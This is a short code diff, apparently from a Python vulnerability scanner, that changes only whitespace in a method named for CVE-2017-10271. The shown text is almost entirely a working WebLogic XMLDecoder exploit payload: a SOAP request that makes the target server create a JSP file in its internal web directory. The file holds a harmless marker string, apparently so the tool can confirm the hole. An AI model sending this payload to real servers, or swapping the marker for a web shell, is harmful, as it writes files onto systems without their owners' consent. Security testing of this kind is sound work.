@@ -31,13 +31,13 @@ class Detect(threading.Thread):
     def CVE_2017_10271(self, url):
         headers = {"Content-Type": "text/xml"}
         exp = '''
-        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Header>
     <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
         <java><java version="1.4.0" class="java.beans.XMLDecoder">
             <object class="java.io.PrintWriter">
                 <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a1.jsp</string><void method="println">
-                    <string><![CDATA[111111111111111111111111111111111]]></string></void><void method="close"/>
+                <string><![CDATA[111111111111111111111111111111111]]></string></void><void method="close"/>
             </object>
         </java>
       </java>
